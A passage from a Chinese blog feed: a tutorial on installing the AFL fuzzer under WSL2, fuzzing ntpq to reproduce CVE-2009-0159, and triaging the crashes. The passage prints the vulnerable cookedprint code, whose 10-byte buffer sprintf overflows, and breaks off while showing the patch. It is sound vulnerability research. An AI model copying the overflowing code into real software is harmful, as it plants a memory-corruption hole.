class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:5"class="footnote-text"><span><a href="https://speed.cloudflare.com/"class="uri">https://speed.cloudflare.com/</a><a href="#fnref:5" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:6"class="footnote-text"><span><a href="https://www.geeksforgeeks.org/layers-of-osi-model/"class="uri">https://www.geeksforgeeks.org/layers-of-osi-model/</a><a href="#fnref:6" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Life &amp; Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Computer Networking</tag>
      
      <tag>Study Notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WSL2下AFL的安装与测试</title>
    <link href="/2021/01/09/Installation-and-testing-of-AFL-under-WSL2/"/>
    <url>/2021/01/09/Installation-and-testing-of-AFL-under-WSL2/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>AFL号称是当前最高级的Fuzzing测试工具之一，由lcamtuf所开发。在众多安全会议白帽演讲中都介绍过这款工具，以及2016年defcon大会的CGC(CyberGrand Challenge，形式为机器自动挖掘并修补漏洞)大赛中多支队伍利用AFLfuzzing技术与符号执行(SymbolicExecution)来实现漏洞挖掘，其中参赛队伍shellphish便是采用AFL(Fuzzing) +angr(Symbolic Execution)技术。</p><p>本文首先简单介绍一下AFL的安装步骤和基本使用方法，随后以ntpq为例记录一下使用AFL来fuzz的过程并对CVE-2009-0159进行了复现和原理分析。</p><h1 id="afl下载与安装">AFL下载与安装</h1><p>AFL可以对有源码和无源码的程序进行fuzz。对有源码的程序Fuzz的原理简单来说就是在程序编译时，向汇编代码中插入自己的指令，从而在程序运行时，计算覆盖率。当把样本喂给程序来Fuzz时，如果AFL发现程序执行了新的路径，就把当前的样本保存在Queue中，基于这个新的样本来继续Fuzz。<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[1]</span></a></sup></p><p>与其他基于插桩技术的fuzzers相比，afl-fuzz具有较低的性能消耗，有各种高效的fuzzing策略和tricks最小化技巧，不需要先行复杂的配置，能无缝处理复杂的现实中的程序。当然AFL也可以直接对没有源码的二进制程序进行测试，但需要QEMU的支持。</p><h2 id="本体安装与测试">本体安装与测试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz<br>tar -xvf afl-latest.tgz<br>cd afl-2.52b<br>make &amp;&amp; sudo make install<br></code></pre></td></tr></table></figure><p><code>which afl-fuzz</code>有回显即安装成功</p><p>推荐去Github<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[2]</span></a></sup>上下载，一直在维护，安装过程相同。(截止发文，最新版为v2.57b)</p><p>Ps. Kali的源中包含afl，可以直接尝试<code>apt install afl</code>。</p><h3 id="测试">测试</h3><ol type="1"><li>新建输入、输出文件夹： <code>mkdir in out</code></li><li>准备初始化testcase, 将testcase内容随意写成aaa:<code>echo aaa &gt; in/testcase</code></li></ol><p>随便找个代码编译测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-gcc test.c -o test<br>afl-fuzz -i in -o out ./test<br></code></pre></td></tr></table></figure><p>启动afl-fuzz中可能会报错，表示某些环境变量没有配置或者配置错误，根据提示修改或配置afl-fuzzoptions以及系统环境变量即可。</p><p>结果大概如下：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/WSL2下AFL的安装与测试/fuzz_test.png" alt="fuzz_test" style="zoom:80%;" /></p><h3 id="工作状态">工作状态</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制<code>afl-whatsup</code>-&gt;在所有代码外面加个循环就好;</li><li>用<code>afl-plot</code>绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="fuzzing结束时机参考">fuzzing结束时机参考</h3><ul><li>状态窗口中”cyclesdone”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考;</li><li>距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握;</li><li>目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见;</li><li>pythia提供的各种数据中，pathcovera达到99或者correctness的值达到1e-08(含义: 从上次发现path/uniqcrash到下一次发现之间大约需要1亿次执行)</li></ul><h3 id="输出结果说明">输出结果说明</h3><ul><li>queue：存放所有具有独特执行路径的测试用例。</li><li>crashes：导致目标接收致命signal而崩溃的独特测试用例。</li><li>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</li><li>hangs：导致目标超时的独特测试用例。</li><li>fuzzer_stats：afl-fuzz的运行状态。</li><li>plot_data：用于afl-plot绘图。</li></ul><h2 id="afl工作原理简介">AFL工作原理简介</h2><p>Fuzz流程：</p><ol type="1"><li>读取输入的初始testcase, 将其放入到queue中；</li><li>从queue中读取内容作为程序输入；</li><li>尝试在不影响流程的情况下精简输入；</li><li>对输入进行自动突变；</li><li>如果突变后的输入能够有新的状态转移，将修改后的输入放入queue中；</li><li>回到2。</li></ol><p>在使用AFL 编译工具afl-gcc对源码进行编译时，程序会使用afl-as工具对编译并未汇编的c/c++代码进行插桩。过程如下：</p><ol type="1"><li>afl-as.h定义了被插入代码中的汇编代码；</li><li>afl-as逐步分析.s文件(汇编代码)，检测代码特征并插入桩。</li></ol><p>详细过程：</p><ol type="1"><li>编译预处理程序对源文件进行预处理，生成预处理文件(.i文件)</li><li>编译插桩程序对.i文件进行编译，生成汇编文件(.s文件)，<strong>afl同时完成插桩</strong></li><li>汇编程序(as)对.s文件进行汇编，生成目标文件(.o文件)</li><li>链接程序(ld)对.o文件进行连接，生成可执行文件(.out/.elf文件)</li></ol><p>当然llvm/clang插桩方式是另外的一套机制，通过修改LLVMIR(中间语言)实现。</p><h2 id="llvm-mode">LLVM Mode</h2><p>LLVMMode(afl-clang)模式编译程序Fuzzing速度是afl-gcc模式的2倍，但是使用此模式必须先安装llvm套件,配置LLVM_CONFIG(<code>export LLVM_CONFIG=</code>whichllvm-config<code></code>),然后在afl/llvm_mode/文件夹下执行make，会在afl目录下生成afl-clang-fast/afl-clang-fast++。使用afl-clang-fast编译C程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">CC=/path_to_afl/afl-clang-fast ./configure [...options...]<br>make<br></code></pre></td></tr></table></figure><p>最后还是会调用clang/clang++来编译程序，在编译程序时会检查编译选项(makefile中的CFLAGS)，clang提供很多内存检查的工具如ASAN/MSAN/UBSAN等，以及afl编译选项AFL_QUIET(Qemu模式)，这些选项可以直接填写进makefile的编译选项也可以设置到环境变量中，afl-gcc/afl-clang在开始编译前会检查这些环境变量。</p><p>Ps.如果出现了<code>error: clang frontend command failed due to signal (use -v to see invocation)</code>错误可以换成GitHub上的最新版本再次尝试。（2.57b版本已修复）</p><h2 id="qemu-mode">Qemu Mode</h2><p>在无源码的情况下Fuzzing二进制文件，需要安装<code>glib2-devel libtool wget python automake autoconf sha384sum bison iconv</code>等依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd afl-2.52b<br>cd qemu_mode<br>./build_qemu_support.sh<br>export AFL_PATH=~/afl-2.52b #afl根目录<br></code></pre></td></tr></table></figure><p>使用apt安装缺失的库即可，如<code>sudo apt install libglib2*</code>(glib2)或 <code>sudo apt-get install libtool*</code> (libtool)。</p><p>当出现util/memfd.c错误时，可参照以下方法<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[3]</span></a></sup>（2.57b版本已修复）</p><p>创建一个名为“memfd_create.diff”的文件，然后将下列代码粘贴进去:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c<br><span class="hljs-comment">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span><br><span class="hljs-comment">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span><br><span class="hljs-meta">@@ -37,7 +37,7 @@</span><br> #include &lt;sys/syscall.h&gt;<br> #include &lt;asm/unistd.h&gt;<br><br><span class="hljs-deletion">-static int memfd_create(const char *name, unsigned int flags)</span><br><span class="hljs-addition">+int memfd_create(const char *name, unsigned int flags)</span><br> &#123;<br> #ifdef __NR_memfd_create<br>     return syscall(__NR_memfd_create, name, flags);<br></code></pre></td></tr></table></figure><p>将memfd_create.diff放在patches/目录下后修改build_qemu_support.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">patch -p1 &lt;../patches/elfload.diff || <span class="hljs-built_in">exit</span> 1<br>patch -p1 &lt;../patches/cpu-exec.diff || <span class="hljs-built_in">exit</span> 1<br>patch -p1 &lt;../patches/syscall.diff || <span class="hljs-built_in">exit</span> 1<br>patch -p1 &lt;../patches/memfd_create.diff || <span class="hljs-built_in">exit</span> 1 <span class="hljs-comment"># 添加一行</span><br></code></pre></td></tr></table></figure><p>然后再次运行build_qemu_support.sh即可</p><p>如遇其他问题可以Google后反馈在评论区，我能解决的问题都会回复。</p><h1 id="ntp-4.2.2-测试">ntp-4.2.2 测试</h1><p>NTP是一种旨在通过网络同步计算机时钟的协议。我们将使用afl对其部件ntpq进行白盒测试以尝试复现CVE-2009-0159<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[4]</span></a></sup>，测试版本为v4.2.2，可<ahref="https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.2.tar.gz">点击此处</a>下载。</p><blockquote><p>ntpq is a utility included as part of the NTP ReferenceImplementation suite of tools. It queries a server (e.g. ntpd) andprovides information to the user.</p></blockquote><h2 id="编译测试">编译测试</h2><p>为加快测试速度，我们只编译测试ntpq部分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">CC=afl-clang-fast ./configure &amp;&amp; AFL_HARDEN=1 make -C ntpq<br>cd ..<br>afl-fuzz -i in -o out ntp-4.2.2/ntpq/ntpq<br></code></pre></td></tr></table></figure><p>你可以在几分钟内找到CVE-2009-0159而无需进一步的工作，尤其是在使用persistentmode时。但当你不够欧时（比如说我），就可能跑到自闭。。。还会多出很多无用的输出文件。（虽然我运行时间确实不长）</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/WSL2下AFL的安装与测试/ntpq.png" alt="ntpq测试" style="zoom:80%;" /></p><h2 id="优化">优化</h2><h3 id="多核并行">多核并行</h3><p>查看系统核心数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq<br></code></pre></td></tr></table></figure><p>afl-fuzz并行Fuzzing一般的做法是通过-M参数指定一个主Fuzzer(MasterFuzzer)、通过-S参数指定多个从Fuzzer(Slave Fuzzer)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">screen afl-fuzz -i in -o out -M fuzzer1 -- ntp-4.2.2/ntpq/ntpq<br>screen afl-fuzz -i in -o out -S fuzzer2 -- ntp-4.2.2/ntpq/ntpq<br>screen afl-fuzz -i in -o out -S fuzzer3 -- ntp-4.2.2/ntpq/ntpq<br></code></pre></td></tr></table></figure><p>PS.-o指定的是一个同步目录，在并行测试中所有的Fuzzer将相互协作，找到新的代码路径时会相互传递新的测试用例，所以不用担心重复的问题。</p><ul><li><p><code>afl-whatsup</code>可以查看每个fuzzer的运行状态和总体运行概况，加上-s选项只显示概况，其中的数据都是所有fuzzer的总和。</p></li><li><p><code>afl-gotcpu</code>可以查看每个核心使用状态。</p></li></ul><h3 id="源码优化">源码优化</h3><p>与其尝试让afl的输出去模拟ntpd程序，不如直接将ntpq/ntpq.c中的<code>main()</code>函数替换为从stdin读取数据类型，状态和数据并将输出文件作为stdout的代码。这也是测试networkprogram的常见方法——隔离测试解析器之类的目标功能。</p><p>将<code>nptqmain()</code>替换如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ntpqmain</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-type">int</span> argc,</span><br><span class="hljs-params"><span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span><br>__AFL_INIT();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">int</span> datatype = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> data[<span class="hljs-number">1024</span> * <span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span><br><span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>))<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>datatype = <span class="hljs-number">0</span>;<br>status = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span> * <span class="hljs-number">16</span>);<br>read(<span class="hljs-number">0</span>, &amp;datatype, <span class="hljs-number">1</span>);<br>read(<span class="hljs-number">0</span>, &amp;status, <span class="hljs-number">1</span>);<br>length = read(<span class="hljs-number">0</span>, data, <span class="hljs-number">1024</span> * <span class="hljs-number">16</span>);<br>cookedprint(datatype, length, data, status, <span class="hljs-built_in">stdout</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>16kb的缓冲区大小可以随意改变，过小的缓冲区可以加快测试速度，但也可能错过某些Bug。</p><p>将下述代码添加到nextvar的开头可以确保这些静态变量不会保留从一次运行到下一次运行的数据，从而显著改善性能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memset</span>(name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(name));<br><span class="hljs-built_in">memset</span>(value, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(value));<br></code></pre></td></tr></table></figure><h3 id="字典">字典</h3><p>在没有任何帮助的情况下afl会耗费很长时间才能找到可以从varfmt返回的所有不同格式，所以我们可以在项目中检测一些可用的字符串到字典中供afl使用，如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *tstflagnames[] = &#123;<br><span class="hljs-string">&quot;pkt_dup&quot;</span>,<span class="hljs-comment">/* TEST1 */</span><br><span class="hljs-string">&quot;pkt_bogus&quot;</span>,<span class="hljs-comment">/* TEST2 */</span><br><span class="hljs-string">&quot;pkt_proto&quot;</span>,<span class="hljs-comment">/* TEST3 */</span><br><span class="hljs-string">&quot;pkt_denied&quot;</span>,<span class="hljs-comment">/* TEST4 */</span><br><span class="hljs-string">&quot;pkt_auth&quot;</span>,<span class="hljs-comment">/* TEST5 */</span><br><span class="hljs-string">&quot;pkt_synch&quot;</span>,<span class="hljs-comment">/* TEST6 */</span><br><span class="hljs-string">&quot;pkt_dist&quot;</span>,<span class="hljs-comment">/* TEST7 */</span><br><span class="hljs-string">&quot;pkt_autokey&quot;</span>,<span class="hljs-comment">/* TEST8 */</span><br><span class="hljs-string">&quot;pkt_crypto&quot;</span>,<span class="hljs-comment">/* TEST9 */</span><br><span class="hljs-string">&quot;peer_stratum&quot;</span>, <span class="hljs-comment">/* TEST10 */</span><br><span class="hljs-string">&quot;peer_dist&quot;</span>,<span class="hljs-comment">/* TEST11 */</span><br><span class="hljs-string">&quot;peer_loop&quot;</span>,<span class="hljs-comment">/* TEST12 */</span><br><span class="hljs-string">&quot;peer_unfit&quot;</span><span class="hljs-comment">/* TEST13 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>使用-x命令调用字典。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i in -o out -x ntpq.dict ntp-4.2.2/ntpq/ntpq<br></code></pre></td></tr></table></figure><p>借助该字典，我们能找到的路径数量会大大增加。</p><h3 id="测试-1">测试</h3><p>重新编译后再次运行fuzz：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/WSL2下AFL的安装与测试/ntpq_m1.png" alt="修改后ntpq测试1" style="zoom:80%;" /></p><p>可以发现搜寻效率与之前相比有了巨大的提升，继续运行：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/WSL2下AFL的安装与测试/ntpq_m3.png" alt="修改后ntpq测试2" style="zoom:80%;" /></p><h2 id="结果分析">结果分析</h2><p>到了这里，我们已经跑出了一大堆的crashes，那么接下来自然是确定造成这些crashes的bug是否可以利用以及怎么利用。后者可能会要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。但如果只是对crash做简单的分析和分类，那么下面介绍的几种方法都可以提供一些帮助。</p><h3 id="crash-exploration-mode">crash exploration mode</h3><p>这是afl-fuzz的一种运行模式，也称为<strong>peruvian rabbitmode</strong>，用于确定bug的可利用性，具体细节可以参考<ahref="https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html">lcamtuf</a>的博客。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -m none -C -i ./out/crashes -o out_crashes -x ntpq.dict -- ntp-4.2.2/ntpq/ntpq_modified<br></code></pre></td></tr></table></figure><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/WSL2下AFL的安装与测试/ntpq_mC.png" alt="crash exploration mode测试" style="zoom:80%;" /></p><p>举个例子，当你发现目标程序尝试写入，那么就可以猜测这个bug应该是可以利用的；然而遇到例如NULLpointer dereferences这样的漏洞就没那么容易判断了。</p><p>将一个导致crash测试用例作为afl-fuzz的输入，使用-C选项开启crashexploration模式后，可以快速地产生很多和输入crash相关、但稍有些不同的crashes，从而判断能够控制某块内存地址的长度。该<ahref="https://countuponsecurity.com/tag/peruvian-were-rabbit/">文章</a>中有一个很不错的例子——tcpdump栈溢出漏洞，crashexploration模式从一个crash产生了42个新的crash，并读取不同大小的相邻内存。</p><h3 id="triage_crashes">triage_crashes</h3><p>AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。例如下面的例子中，11代表了SIGSEGV信号，有可能是因为缓冲区溢出导致进程引用了无效的内存。而其他如06代表了SIGABRT信号，可能是执行了abortfree导致。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">~/AFL-2.57b/experimental/crash_triage/triage_crashes.sh out_test ntp-4.2.2/ntpq/ntpq_modified 2&gt;&amp;1 | grep SIGNAL<br>   +++ ID 000000, SIGNAL 11 +++<br>   +++ ID 000001, SIGNAL 11 +++<br>   +++ ID 000002, SIGNAL 11 +++<br>   +++ ID 000003, SIGNAL 11 +++<br>   +++ ID 000004, SIGNAL 11 +++<br>   +++ ID 000005, SIGNAL 11 +++<br>   +++ ID 000006, SIGNAL 11 +++<br>   ...<br></code></pre></td></tr></table></figure><h3 id="crashwalk">crashwalk</h3><p>当然上面的两种方式都过于鸡肋了，如果你想得到更细致的crashes分类结果，以及导致crashes的具体原因，那么<ahref="https://github.com/bnagy/crashwalk">crashwalk</a>就是不错的选择之一。这个工具基于gdb的exploitable插件，安装也相对简单（<del>但我懒得装</del>），具体方法可以参考工具的安装文档。</p><p>crashwalk支持AFL/Manual两种模式。前者通过读取<strong>crashes/README.txt</strong>文件获得目标的执行命令，后者则可以手动指定一些参数。两种使用方式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Manual Mode</span><br>cwtriage -root ./crashes/ -match id -- ntp-4.2.2/ntpq/ntpq_modified<br><span class="hljs-meta prompt_"># </span><span class="language-bash">AFL Mode</span><br>cwtriage -root . -afl<br></code></pre></td></tr></table></figure><p>两种模式的输出结果都一样，也比前面几种方法要详细多了，但当有大量crashes时结果还是显得十分混乱。</p><h3 id="afl-collect">afl-collect</h3><p>最后重磅推荐的工具便是afl-collect，它也是<ahref="https://gitlab.com/rc0r/afl-utils">afl-utils</a>套件中的一个工具，同样也是基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。使用起来命令稍微长一点，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-collect -j 8 -d crashes.db -e gdb_script ./out ./in -- ntp-4.2.2/ntpq/ntpq_modified --target-opts<br></code></pre></td></tr></table></figure><p>但是结果就像下面这样非常直观：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/WSL2下AFL的安装与测试/ntpq_m_collect.png" alt="afl-collect" style="zoom:80%;" /></p><h2 id="漏洞分析">漏洞分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Format values</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OC 12<span class="hljs-comment">/* integer, print in octal */</span></span><br><br><span class="hljs-comment">/* skip */</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * cookedprint - output variables in cooked mode</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cookedprint</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-type">int</span> datatype,</span><br><span class="hljs-params"><span class="hljs-type">int</span> length,</span><br><span class="hljs-params"><span class="hljs-type">char</span> *data,</span><br><span class="hljs-params"><span class="hljs-type">int</span> status,</span><br><span class="hljs-params">FILE *fp)</span><br>&#123;<br><span class="hljs-keyword">register</span> <span class="hljs-type">int</span> varid;<br><span class="hljs-type">char</span> *name;<br><span class="hljs-type">char</span> *value;<br><span class="hljs-type">int</span> fmt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctl_var</span> *<span class="hljs-title">varlist</span>;</span><br>u_long uval;<br><br><span class="hljs-comment">/* skip */</span><br><br><span class="hljs-keyword">while</span> (nextvar(&amp;length, &amp;data, &amp;name, &amp;value))<br>&#123;<br>varid = findvar(name, varlist, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (varid == <span class="hljs-number">0</span>)<br>&#123;<br>            <span class="hljs-comment">/* skip */</span><br>         &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>output_raw = <span class="hljs-number">0</span>;<br>fmt = varlist[varid].fmt;<br><span class="hljs-keyword">switch</span> (fmt)<br>&#123;<br>                    <span class="hljs-comment">/* skip */</span><br>                    <span class="hljs-keyword">case</span> OC:<br><span class="hljs-keyword">if</span> (!decodeuint(value, &amp;uval))<br>output_raw = <span class="hljs-string">&#x27;?&#x27;</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-type">char</span> b[<span class="hljs-number">10</span>];<br><br>(<span class="hljs-type">void</span>)<span class="hljs-built_in">sprintf</span>(b, <span class="hljs-string">&quot;%03lo&quot;</span>, uval);<br>output(fp, name, b);<br>&#125;<br><span class="hljs-keyword">break</span>;<br>                    <span class="hljs-comment">/* skip */</span><br>            &#125;<br>        &#125;<br>&#125;<br>    <span class="hljs-comment">/* not vital */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>程序使用while循环迭代检索<code>data</code>缓冲区的下一个变量，然后调用<code>findvar()</code>判断<code>name</code>是否已知。当返回不为0时，它会跳转到<code>else</code>并将<code>fmt</code>设置为<code>ctl_var</code>结构中的相应变量。当该格式为0C时（<code>#define OC 12   /* integer, print in octal */</code>)，它将调用<code>decodeuint</code>从<code>value</code>中解码一个无符号整数并将结果存储到<code>uval</code>无符号long中。如果失败，它将跳到<code>else</code>部分，在该部分中会声明一个10字节大小的本地缓冲区，然后尝试向其中写入解析为有符号八进制长整型的<code>uval</code>。这意味着我们可以写入不包括<code>NULL</code>的11个字节。由于缓冲区<code>b</code>只有10个字节长，因此上面的代码可能会出现off-by-twooverflow，后面对<code>output()</code>的调用只是将<code>name = b</code>传给到<code>fp</code>。</p><h3 id="补丁">补丁</h3><p>将代码修改如下即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">    output_raw = <span class="hljs-string">&#x27;?&#x27;</span>;<br><span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-comment">//char b[10];</span><br>         <span class="hljs-type">char</span> b[<span class="hljs-number">12</span>];<br>         <span class="hljs-comment">//(void) sprintf(b, 